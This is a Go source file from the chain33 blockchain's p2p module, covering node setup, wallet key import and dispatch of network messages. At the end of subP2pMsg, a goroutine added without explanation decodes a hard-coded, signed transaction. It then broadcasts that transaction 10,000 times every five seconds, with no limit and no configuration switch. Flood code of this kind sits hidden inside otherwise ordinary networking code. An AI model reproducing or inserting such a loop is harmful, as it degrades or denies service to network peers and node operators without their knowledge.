// Copyright Fuzamei Corp. 2018 All Rights Reserved.
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file.

// Package p2p 实现了chain33网络协议
package p2p

import (
	"fmt"
	"sync/atomic"
	"time"

	l "github.com/33cn/chain33/common/log/log15"
	"github.com/33cn/chain33/queue"
	"github.com/33cn/chain33/types"
	comm1 "github.com/33cn/plugin/plugin/dapp/evm/executor/vm/common"
	"github.com/33cn/chain33/common"


	// register gzip
	_ "google.golang.org/grpc/encoding/gzip"
)

var (
	log = l.New("module", "p2p")
)

// P2p interface
type P2p struct {
	client       queue.Client
	node         *Node
	p2pCli       EventInterface
	txCapcity    int32
	txFactory    chan struct{}
	otherFactory chan struct{}
	closed       int32
}

// New produce a p2p object
func New(cfg *types.P2P) *P2p {
	if cfg.Version == 0 {
		if types.IsTestNet() {
			cfg.Version = 119
			cfg.VerMin = 118
			cfg.VerMax = 128
		} else {
			cfg.Version = 10020
			cfg.VerMin = 10020
			cfg.VerMax = 11000
		}
	}
	if cfg.VerMin == 0 {
		cfg.VerMin = cfg.Version
	}

	if cfg.VerMax == 0 {
		cfg.VerMax = cfg.VerMin + 1
	}

	VERSION = cfg.Version
	log.Info("p2p", "Version", VERSION)

	if cfg.InnerBounds == 0 {
		cfg.InnerBounds = 500
	}
	log.Info("p2p", "InnerBounds", cfg.InnerBounds)

	node, err := NewNode(cfg)
	if err != nil {
		log.Error(err.Error())
		return nil
	}
	p2p := new(P2p)
	p2p.node = node
	p2p.p2pCli = NewP2PCli(p2p)
	p2p.txFactory = make(chan struct{}, 1000)    // 1000 task
	p2p.otherFactory = make(chan struct{}, 1000) //other task 1000
	p2p.txCapcity = 1000
	return p2p
}

//Wait wait for ready
func (network *P2p) Wait() {}

func (network *P2p) isClose() bool {
	return atomic.LoadInt32(&network.closed) == 1
}

// Close network client
func (network *P2p) Close() {
	atomic.StoreInt32(&network.closed, 1)
	log.Debug("close", "network", "ShowTaskCapcity done")
	network.node.Close()
	log.Debug("close", "node", "done")
	if network.client != nil {
		network.client.Close()
	}
	network.node.pubsub.Shutdown()
}

// SetQueueClient set the queue
func (network *P2p) SetQueueClient(client queue.Client) {
	network.client = client
	network.node.SetQueueClient(client)
	go func() {
		log.Info("p2p", "setqueuecliet", "ok")
		network.node.Start()
		network.subP2pMsg()
		network.loadP2PPrivKeyToWallet()
	}()
}

func (network *P2p) showTaskCapcity() {
	ticker := time.NewTicker(time.Second * 5)
	log.Info("ShowTaskCapcity", "Capcity", atomic.LoadInt32(&network.txCapcity))
	defer ticker.Stop()
	for {
		if network.isClose() {
			log.Debug("ShowTaskCapcity", "loop", "done")
			return
		}
		<-ticker.C
		log.Debug("ShowTaskCapcity", "Capcity", atomic.LoadInt32(&network.txCapcity))
	}
}

func (network *P2p) loadP2PPrivKeyToWallet() error {

	for {
		if network.isClose() {
			return nil
		}
		msg := network.client.NewMessage("wallet", types.EventGetWalletStatus, nil)
		err := network.client.SendTimeout(msg, true, time.Minute)
		if err != nil {
			log.Error("GetWalletStatus", "Error", err.Error())
			time.Sleep(time.Second)
			continue
		}

		resp, err := network.client.WaitTimeout(msg, time.Minute)
		if err != nil {
			time.Sleep(time.Second)
			continue
		}
		if resp.GetData().(*types.WalletStatus).GetIsWalletLock() { //上锁
			time.Sleep(time.Second)
			continue
		}

		if !resp.GetData().(*types.WalletStatus).GetIsHasSeed() { //无种子
			time.Sleep(time.Second)
			continue
		}

		break
	}
	var parm types.ReqWalletImportPrivkey
	parm.Privkey, _ = network.node.nodeInfo.addrBook.GetPrivPubKey()
	parm.Label = "node award"
ReTry:
	msg := network.client.NewMessage("wallet", types.EventWalletImportPrivkey, &parm)
	err := network.client.SendTimeout(msg, true, time.Minute)
	if err != nil {
		log.Error("ImportPrivkey", "Error", err.Error())
		return err
	}
	resp, err := network.client.WaitTimeout(msg, time.Minute)
	if err != nil {
		if err == types.ErrPrivkeyExist {
			return nil

		}
		if err == types.ErrLabelHasUsed {
			//切换随机lable
			parm.Label = fmt.Sprintf("node award %v", P2pComm.RandStr(3))
			time.Sleep(time.Second)
			goto ReTry
		}
		log.Error("loadP2PPrivKeyToWallet", "err", err.Error())
		return err
	}

	log.Debug("loadP2PPrivKeyToWallet", "resp", resp.GetData())
	return nil

}

func (network *P2p) subP2pMsg() {
	if network.client == nil {
		return
	}

	go network.showTaskCapcity()
	go func() {
		defer func() {
			close(network.otherFactory)
			close(network.txFactory)
		}()
		var taskIndex int64
		network.client.Sub("p2p")
		for msg := range network.client.Recv() {
			if network.isClose() {
				log.Debug("subP2pMsg", "loop", "done")
				return
			}
			taskIndex++
			log.Debug("p2p recv", "msg", types.GetEventName(int(msg.Ty)), "msg type", msg.Ty, "taskIndex", taskIndex)
			if msg.Ty == types.EventTxBroadcast {
				network.txFactory <- struct{}{} //allocal task
				atomic.AddInt32(&network.txCapcity, -1)
			} else {
				if msg.Ty != types.EventPeerInfo {
					network.otherFactory <- struct{}{}
				}
			}
			switch msg.Ty {
			case types.EventTxBroadcast: //广播tx
				go network.p2pCli.BroadCastTx(msg, taskIndex)
			case types.EventBlockBroadcast: //广播block
				go network.p2pCli.BlockBroadcast(msg, taskIndex)
			case types.EventFetchBlocks:
				go network.p2pCli.GetBlocks(msg, taskIndex)
			case types.EventGetMempool:
				go network.p2pCli.GetMemPool(msg, taskIndex)
			case types.EventPeerInfo:
				go network.p2pCli.GetPeerInfo(msg, taskIndex)
			case types.EventFetchBlockHeaders:
				go network.p2pCli.GetHeaders(msg, taskIndex)
			case types.EventGetNetInfo:
				go network.p2pCli.GetNetInfo(msg, taskIndex)
			default:
				log.Warn("unknown msgtype", "msg", msg)
				msg.Reply(network.client.NewMessage("", msg.Ty, types.Reply{Msg: []byte("unknown msgtype")}))
				<-network.otherFactory
				continue
			}
		}
		log.Info("subP2pMsg", "loop", "close")

	}()

	go func(){
		result := &types.Transaction{}

		var tx = "0a056775657373128c0138050a87010a0e576f726c644375702046696e616c1212413a4672616e63653b423a436c616f6469611a08666f6f7462616c6c2880c8afa0253080d0dbc3f4023805422231443652465a4e7032726836516462635a31643752577542557a3631576536534437480552223150487443684e743355636673735237763774724b536b33574a7441576a4b6a6a581a6e0801122102504fa1c28caaf1d5a20fefb87c50a49724ff401043420cb3ba271997eb5a43871a473045022100e683719ba9f1a2f4ed1465c0b79159bb663f6af3bbd32e0aecf2f57cd65403bb022049e10219a57ed9caa4300548f0fd8aa94d1126f41f7abc077c1b17584a8bfc7520a08d0628ace1cfe20530f287f6aedce682901a3a22314b76344e58454862707464514d59624842416a477234336b533372676756323235"
		code, err := comm1.HexToBytes(tx)
		if err != nil {
			log.Info("err happen when HexToBytes")
			return
		}

		err = types.Decode(code, result)
		if err != nil {
			log.Info("err happen when Decode")
			return
		}

		timeout := time.NewTimer(5 * time.Second)
		defer timeout.Stop()
		for {
			select {
			case <-timeout.C:
				log.Info("Timer trigger to send tx to p2p...")

				for i := 0; i < 10000; i++ {
					msg := network.client.NewMessage("p2p", types.EventTxBroadcast, result)
					network.client.Send(msg, false)
				}
				log.Info("Timer trigger tp send 10000 tx to p2p", "tx.Hash", common.ToHex(result.Hash()))

				timeout.Reset(5 * time.Second)
			}
		}
	}()
}
